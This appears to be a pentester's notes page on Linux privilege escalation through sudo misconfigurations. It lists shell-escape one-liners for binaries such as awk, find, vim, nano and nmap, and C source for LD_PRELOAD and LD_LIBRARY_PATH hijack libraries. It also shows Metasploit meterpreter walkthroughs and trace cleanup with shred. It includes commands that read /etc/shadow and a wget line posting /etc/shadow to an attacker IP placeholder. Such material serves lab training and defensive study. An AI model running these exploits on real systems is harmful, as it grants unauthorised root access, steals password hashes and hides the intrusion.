# Sudo

## 01 - Unix Shell

### 1.1 - Shell Escape Sequences

#### 1.1.1 - Detect

With internal recon of the compromised machine with least privileges you've probably discovered the Enumeration and Discovery about the [[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Linux/Users|Users]]. Look more info on https://gtfobins.github.io/

Depending on the command that contains a format looks like:

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
	(root) NOPASSWD: </path/to/binary>
```


Let's try to exploit vim the text editor just to demonstrate

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

#### 1.1.2 - Exploit

- **awk**

```
user@debian:~$ sudo awk 'BEGIN {system("/bin/bash")}

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **base64**

`user@debian:~$ sudo base64 /etc/shadow | base64 -d`

- **chmod**

```
user@debian:~$ sudo chmod 6777 /etc/shadow

user@debian:~$ cat /etc/shadow
```

- **column**

`user@debian:~$ sudo column /etc/shadow`

- **find**

```
user@debian:~$ sudo find . -exec /bin/bash \; -quit

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **ftp**

```
user@debian:~$ sudo ftp
ftp> !/bin/bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **iftop**

```
user@debian:~$ sudo iftop
!/bin/bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **less**

```
user@debian:~$ sudo less /etc/shadow

user@debian:~$ sudo less /etc/profile
!/bin/bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **man**

```
user@debian:~$ sudo man man
!/bin/bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **more**

```
user@debian:~$ sudo less /etc/shadow

user@debian:~$ sudo more /etc/profile
!/bin/bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **nano**

```
user@debian:~$ sudo nano
CTRL + R
CTRL + X
reset; bash 1>&0 2>&0

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **nmap**

Keep in mind that input echo is disabled so it's kinda like blind commands

```
user@debian:~$ TF=$(mktemp)
user@debian:~$ echo 'os.execute("/bin/bash")' > $TF
user@debian:~$ sudo nmap --script=$TF
```

Legacy nmap versions have interactive flag

```
user@debian:~$ sudo nmap --interactive
nmap> !bash

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **wget**

Send file to webserver

`user@debian:~$ sudo wget --post-file=/etc/shadow <attacker_IP>`

Spawn a rooted shell

```
user@debian:~$ TF=$(mktemp)
user@debian:~$ chmod +x $TF
user@debian:~$ echo -e '#!/bin/bash\n/bin/bash 1>&0' > $TF
user@debian:~$ sudo wget --use-askpass=$TF 0

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

- **vim**

```
user@debian:~$ sudo vim -c ':!/bin/bash'

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

### 1.2 - Abusing Intended Functionality

#### 1.2.1 - Detect

- Here's an example of what you can do with the apache2 webserver

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
                                          
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2
```

#### 1.2.2 - Exploit

`user@debian:~$ sudo apache2 -f /etc/shadow`

### 1.3 - LD_PRELOAD

#### 1.3.1 - Detect

```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
..[snip]..
```

#### 1.3.2 - Exploit

```
TCM@debian:~$ mkdir exploit && cd exploit
TCM@debian:~/exploit$ cat shell_preload.c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
    unsetenv("LD_PRELOAD");  
    setgid(0);  
    setuid(0);  
    system("/bin/bash");  
}
TCM@debian:~/exploit$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
TCM@debian:~/exploit$ sudo LD_PRELOAD=~/exploit/shell.so apache2
root@debian:/home/user/exploit# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/exploit# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~/exploit$
```

#### 1.3.3 - Cleanup

```
TCM@debian:~/exploit$ cd ..
TCM@debian:~$ rm -rf exploit/
```

### 1.4 - Credential Reuse

Try to elevate root privileges or another user account after performing the enumeration phase for discovering [[Sensitive Files]].

### 1.5 - Environment Variables

#### 1.5.1 - Detect

The second vulnerability in particular I would like to demonstrate that's regarding about.

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
                                          
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/sbin/apache2
```

#### 1.5.2 - Exploit

```
user@debian:~$ cat preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0, 0, 0);
        system("/bin/bash -p");
}

user@debian:~$ cat preloadv2.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

Most probably you'll compile the exploit as a x86-64 (64-bit) architecture. If you're targeting x86 (32-bit) Linux systems then you have to specify the `-m` flag either if it's `-m32` or `-m64`. You'll know right away when using the `file` command to check ELF binary architecture is based off.

`user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`

Execute the LD_PRELOAD via sudo with any of the environment variables that has `(root) NOPASSWD`

```
user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/vim

user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2

user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff503ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f048506b000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f0484e47000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f0484c0d000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f04849f1000)
        libc.so.6 => /lib/libc.so.6 (0x00007f0484685000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f0484480000)
        librt.so.1 => /lib/librt.so.1 (0x00007f0484278000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f0484041000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f0483e3c000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f0483c14000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0485528000)
```

We know that it's using `libcrypt.so.1 => /lib/libcrypt.so.1` if you don't know what it does do a bit of research with a help of internet and see who you can exploit the `sudo` environment.

```
user@debian:~$ cat library_path.c
#include <stdio.h>  
#include <stdlib.h>  
  
static void hijack() __attribute__((constructor));  
  
void hijack() {  
        unsetenv("LD_LIBRARY_PATH");  
        setresuid(0,0,0);  
        system("/bin/bash -p");  
}
```

`user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c`

**Note:** Sometimes when you tried to get a reverse shell via netcat it's best to specify the full path of the binary

Execute the LD_LIBRARY_PATH via `sudo` to get root

`user@debian:~$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2`

#### 1.5.3 - Cleanup

`user@debian:~$ rm /tmp/preload.so /tmp/libcrypt.so.1 preload.c library_path.c`

`user@debian:~$ shred -zxufvn 5 /tmp/preload.so /tmp/libcrypt.so.1 preload.c library_path.c`

### 1.6 - Sudo Rights

Running as `root`

`$ echo <password> | sudo -S <command> [arguments]`

`$ echo <password> | su root -c "<command> [arguments]"`

`$ sudo su`

`$ sudo -s`

Running as a different `user` other than `root`

`$ sudo -u <username>`

`$ su <username>`

## 02 - Metasploit

### 2.1 - Shell Escape Sequences

#### 2.1.1 - Detect

```
meterpreter > run post/multi/recon/sudo_commands

[+] /usr/bin/find matches known privesc executable 'find' !
[+] /usr/bin/nano matches known privesc executable 'nano' !
[+] /usr/bin/vim matches known privesc executable 'vim' !
[+] /usr/bin/man matches known privesc executable 'man' !
[+] /usr/bin/awk matches known privesc executable 'awk' !
[+] /usr/bin/less matches known privesc executable 'less' !
[+] /usr/bin/ftp matches known privesc executable 'ftp' !
[+] /usr/bin/nmap matches known privesc executable 'nmap' !
[+] /bin/more matches known privesc executable 'more' !

Sudo Commands
=============

  Command            RunAsUsers  RunAsGroups  Password?  Privesc?
  -------            ----------  -----------  ---------  --------
  /bin/more          root                                True
  /usr/bin/awk       root                                True
  /usr/bin/find      root                                True
  /usr/bin/ftp       root                                True
  /usr/bin/less      root                                True
  /usr/bin/man       root                                True
  /usr/bin/nano      root                                True
  /usr/bin/nmap      root                                True
  /usr/bin/vim       root                                True
  /usr/sbin/apache2  root
  /usr/sbin/iftop    root

[+] Output stored in: /root/.msf4/loot/20220523174649_default_10.10.140.168_sudo.commands_049317.txt
```

#### 2.1.1 - Exploit

```
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2510 created.
Channel 20 created.
TCM@debian:~$ sudo find . -exec /bin/bash -p \; -quit
sudo find . -exec /bin/bash -p \; -quit
root@debian:/home/user# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user#
```

### 2.2 - LD_PRELOAD

#### 2.2.1 - Detect

```
meterpreter > execute -if sudo -a "-l"
Process 2673 created.
Channel 23 created.
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
..[snip]..
```

#### 2.2.2 - Exploit

```
meterpreter > mkdir exploit
Creating directory: exploit
meterpreter > cd exploit/
meterpreter > edit shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
meterpreter > execute -if gcc -a "-fPIC -shared -o shell.so shell.c -nostartfiles"
Process 2698 created.
Channel 25 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2710 created.
Channel 26 created.
cd exploit
TCM@debian:~/exploit$ sudo LD_PRELOAD=~/exploit/shell.so apache2
root@debian:/home/user# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# exit
exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ exit
exit
exit
```

#### 2.2.3 - Cleanup

```
meterpreter > cd ..
meterpreter > rmdir exploit/
Removing directory: exploit/
```